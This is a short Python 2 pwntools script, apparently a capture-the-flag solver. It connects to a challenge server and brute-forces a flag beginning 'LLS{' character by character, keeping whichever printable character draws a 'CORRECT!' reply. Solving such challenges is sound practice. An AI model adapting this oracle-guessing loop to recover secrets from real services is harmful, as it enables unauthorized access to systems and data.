from pwn import *
from string import printable
context.log_level='critical'
flag='LLS{'
s=remote("jh2i.com", 50012)
s.recvuntil(">")
while (True):
	for ch in printable:
		print "tring with flag "   +  flag
		print "trying with char " +  ch
		s.send(flag+ch)
		a= s.recvuntil(">").split('\n')[-3]
       		print a
		if "CORRECT!"    in a:
                	flag+=ch
                	print flag
                	break



